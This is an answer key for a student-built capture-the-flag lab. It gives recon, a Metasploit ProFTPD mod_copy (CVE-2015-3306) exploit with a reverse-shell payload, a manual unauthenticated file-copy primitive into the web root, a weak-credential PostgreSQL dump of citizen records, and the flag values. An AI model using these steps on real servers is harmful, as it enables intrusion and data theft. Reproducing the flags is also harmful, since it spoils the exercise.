# SOLUTION / Answer Key — The Forgotten Server

> Spoilers. This is for the group that built the lab and for grading. It
> documents every intended weakness and one clean path to each flag.

## Overview of planted weaknesses

| # | Service        | Weakness                                              | Category                 |
|---|----------------|-------------------------------------------------------|--------------------------|
| 1 | FTP (ProFTPD 1.3.5) | **CVE-2015-3306** `mod_copy` — unauthenticated `SITE CPFR`/`SITE CPTO` arbitrary file read/write | Outdated software |
| 2 | Web (Apache+PHP) | **World-writable DocumentRoot** shared with the FTP process → mod_copy drops a PHP webshell → **RCE** | Permissions / RCE |
| 3 | PostgreSQL     | **Weak admin credentials** `admin` / `123456`, port exposed | Credentials        |
| – | SSH (OpenSSH)  | Hardened decoy — no root login, key-only auth, locked account | (not vulnerable)  |

This satisfies the assignment: 3+ services, 2+ vulnerabilities, ≥1
permission/credential weakness, unauthorized access + code execution, realistic
content, and clear-text traffic that can be observed.

> Note: FTP **anonymous login is disabled** — normal logins fail. The CVE is
> still exploitable because `SITE CPFR`/`CPTO` are reachable *before*
> authentication in 1.3.5.

---

## Recon

```bash
nmap -sV -p- <TARGET_IP>
```

Expected: `21/tcp ftp ProFTPD 1.3.5`, `80/tcp http Apache`,
`2222/tcp ssh OpenSSH`, `5432/tcp postgresql`. The ProFTPD banner
(`220 ... ProFTPD 1.3.5 ...`) is the tell — 1.3.5 is vulnerable to
CVE-2015-3306. Note the web server on :80 — it shares a filesystem with FTP.

---

## Flag 1 — remote code execution → `FLAG{GeT_rEkT}`

The flag is at `/var/www/flag.txt` — **outside** the web DocumentRoot, so
`http://<TARGET_IP>/flag.txt` is a 404. You must execute code and read it.

### The easy way: Metasploit
```
msfconsole
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS <TARGET_IP>
set RPORT 21
set SITEPATH /var/www/html      # world-writable, served by Apache
set TARGETURI /                 # DocumentRoot is reachable at /
set HTTPPORT 80
set payload cmd/unix/reverse_perl   ; set LHOST <YOUR_IP>   # or a generic/bind payload
run
# then in the session:
cat /var/www/flag.txt           # -> FLAG{GeT_rEkT}
```

### How it works (what the module automates)
1. Connect to FTP (no login). ProFTPD reflects the current command into its
   process title, i.e. `/proc/self/cmdline`.
2. Send a command containing a small PHP payload, then
   `SITE CPFR /proc/self/cmdline` and `SITE CPTO /var/www/html/<name>.php` to
   copy that PHP into the web root (writable by the ProFTPD process).
3. Request `http://<TARGET_IP>/<name>.php` — Apache runs it as `www-data`.

Manual proof of the underlying primitive (benign, no payload):
```
nc <TARGET_IP> 21         # do NOT log in
SITE CPFR /etc/hostname
SITE CPTO /var/www/html/x.txt
# then: curl http://<TARGET_IP>/x.txt   -> proves unauth write into the web root
```

---

## Flag 2 — CPR-Register → `FLAG{BaD_PaSS}`

The database uses `admin` / `123456` and the port is exposed.

```bash
# With psql
PGPASSWORD=123456 psql -h <TARGET_IP> -U admin -d postgres -c \
  "SELECT firstname, lastname, cpr FROM citizens;"
```

One citizen's `firstname` is `FLAG{BaD_PaSS}` (Mortensen, CPR 310893-3333).

No psql client? Use any Postgres GUI/driver, or:
```bash
nmap -p 5432 --script pgsql-brute <TARGET_IP>      # confirms weak creds
```

---

## Observing the attack in network traffic

```bash
sudo tcpdump -i any -w forgotten.pcap host <TARGET_IP>
```
Open in Wireshark:
- **FTP** (port 21) is clear text — the `SITE CPFR/CPTO` commands and the PHP
  payload are all readable. Use "Follow TCP Stream".
- **HTTP** (port 80) is clear text — the request that triggers the webshell and
  its output are visible.
- **PostgreSQL** (port 5432) auth and the returned rows are visible in clear
  text as well.
- **SSH** (port 2222) is encrypted — you can see the connection and version
  exchange but not the payload. Good contrast for the write-up.

---

## Reset between groups

```bash
docker compose down -v && docker compose up -d --build
```
`-v` drops the Postgres volume so the seed data (and the flag) is recreated.
```
